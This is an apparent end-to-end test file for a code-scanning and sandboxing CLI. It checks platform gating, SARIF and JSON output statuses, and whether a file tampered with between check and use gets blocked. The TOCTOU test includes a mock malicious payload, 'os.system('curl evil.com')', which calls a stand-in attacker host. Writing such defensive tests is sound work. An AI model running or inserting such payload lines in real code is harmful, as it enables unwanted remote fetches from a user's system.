import { describe, expect, test, beforeAll, afterAll } from "bun:test";
import { spawnSync } from "node:child_process";
import * as fs from "node:fs";
import * as path from "node:path";

const cliPath = path.resolve(__dirname, "..", "dist", "index.js");
const scratchDir = path.resolve(__dirname, "e2e-scratch");

beforeAll(() => {
	if (!fs.existsSync(scratchDir)) {
		fs.mkdirSync(scratchDir, { recursive: true });
	}
});

afterAll(() => {
	if (fs.existsSync(scratchDir)) {
		fs.rmSync(scratchDir, { recursive: true, force: true });
	}
});

describe("Production Fixes E2E Tests", () => {
	test("Linux sandboxing does not instantly block execution based on OS", () => {
		// Even if the sandbox binary doesn't exist, it should hit the binary check,
		// NOT the OS platform blocker.
		const testFile = path.join(scratchDir, "test.py");
		fs.writeFileSync(testFile, "print('hello')");

		const result = spawnSync("node", [cliPath, "run", testFile, "--experimental"], {
			encoding: "utf-8",
		});

		// Ensure it doesn't fail with the old macOS-only block
		expect(result.stderr).not.toContain("sandbox binary is macOS-only");
		expect(result.stderr).not.toContain("Linux/Windows support is planned");
	});

	test("JSON-v2 and SARIF output correctly flag Python files as unsupported for Taint Tracking", () => {
		const pythonFile = path.join(scratchDir, "unsupported.py");
		fs.writeFileSync(pythonFile, "import os\nos.system('echo hi')");

		const jsFile = path.join(scratchDir, "supported.js");
		fs.writeFileSync(jsFile, "eval('console.log(1)')");

		const jsonOutFile = path.join(scratchDir, "out.json");

		// Run check using JSON-v2 format
		const resultJson = spawnSync(
			"node",
			[cliPath, "check", pythonFile, jsFile, "--format", "json-v2", "--output", jsonOutFile],
			{ encoding: "utf-8" }
		);

		if (!fs.existsSync(jsonOutFile)) {
			console.log(resultJson.stderr);
			console.log(resultJson.stdout);
		}

		const jsonContent = JSON.parse(fs.readFileSync(jsonOutFile, "utf-8"));
		
		expect(jsonContent).toHaveProperty("files_status");
		const pyStatus = jsonContent.files_status.find((s: any) => s.file.includes("unsupported.py"));
		const jsStatus = jsonContent.files_status.find((s: any) => s.file.includes("supported.js"));

		expect(pyStatus.status).toBe("unsupported_taint_tracking");
		expect(jsStatus.status).toBe("scanned_full");

		const sarifOutFile = path.join(scratchDir, "out.sarif");

		// Run check using SARIF format
		spawnSync(
			"node",
			[cliPath, "check", pythonFile, jsFile, "--format", "sarif", "--output", sarifOutFile],
			{ encoding: "utf-8" }
		);

		const sarifContent = JSON.parse(fs.readFileSync(sarifOutFile, "utf-8"));
		
		const artifacts = sarifContent.runs[0].artifacts;
		const pyArtifact = artifacts.find((a: any) => a.location.uri.includes("unsupported.py"));
		const jsArtifact = artifacts.find((a: any) => a.location.uri.includes("supported.js"));

		expect(pyArtifact.properties.status).toBe("unsupported_taint_tracking");
		expect(jsArtifact.properties.status).toBe("scanned_full");
	});

	test("Golden Snapshots block execution if file is tampered with TOCTOU", async () => {
		const { spyOn } = require("bun:test");
		const { runAgent } = require("./commands/run");
		const childProcess = require("node:child_process");

		const dummyTarget = path.join(scratchDir, "dummy-toctou.py");
		
		// Mock process.exit so we don't kill the test runner when execution is blocked
		const exitSpy = spyOn(process, "exit").mockImplementation((code: number) => {
			throw new Error(`process.exit called with ${code}`);
		});
		
		// Capture stderr to assert the right security message is logged
		let stderr = "";
		const errSpy = spyOn(console, "error").mockImplementation((...args: any[]) => {
			stderr += args.join(" ") + "\n";
		});

		// Deterministic TOCTOU Mock: 
		// Return 'safe' code during the Time-of-Check (Golden Snapshot generation).
		// Return 'malicious' code during the Time-of-Use (Verification Gate).
		const originalRead = fs.readFileSync;
		let readCount = 0;
		const readSpy = spyOn(fs, "readFileSync").mockImplementation((p: any, o: any) => {
			if (typeof p === "string" && p.endsWith("dummy-toctou.py")) {
				readCount++;
				if (readCount === 1) return "print('safe')"; // Time of Check
				if (readCount === 2) return "import os; os.system('curl evil.com')"; // Time of Use
			}
			return originalRead(p, o as any) as any;
		});

		// Mock existsSync so runAgent bypasses initial file presence checks
		const originalExists = fs.existsSync;
		const existsSpy = spyOn(fs, "existsSync").mockImplementation((p: any) => {
			if (typeof p === "string" && p.endsWith("dummy-toctou.py")) return true;
			if (typeof p === "string" && p.endsWith("wh-sandbox")) return true;
			return originalExists(p);
		});

		// Mock spawnSync to definitively prove that IPC sandbox execution NEVER OCCURS
		const spawnSpy = spyOn(childProcess, "spawnSync").mockImplementation(() => {
			throw new Error("Sandbox was executed despite TOCTOU mismatch!");
		});

		try {
			// This invokes the actual CLI pipeline synchronously inside the test
			await runAgent(dummyTarget, "");
		} catch (err: any) {
			// Assert that process.exit(1) was called via our mock exception
			expect(err.message).toBe("process.exit called with 1");
		}

		// Assertions requested by user:
		
		// 1. Definitively assert the tampered payload side-effect never happened.
		// Mocking spawnSync proves execution was blocked at the boundary.
		expect(spawnSpy).not.toHaveBeenCalled();
		
		// 2. Sandbox never actually executed the payload (proper security error printed)
		expect(stderr).toContain("SECURITY VIOLATION: Execution Blocked");
		expect(stderr).toContain("Payload signature mismatch detected");
		
		// Clean up
		exitSpy.mockRestore();
		errSpy.mockRestore();
		readSpy.mockRestore();
		existsSpy.mockRestore();
		spawnSpy.mockRestore();
	});
});
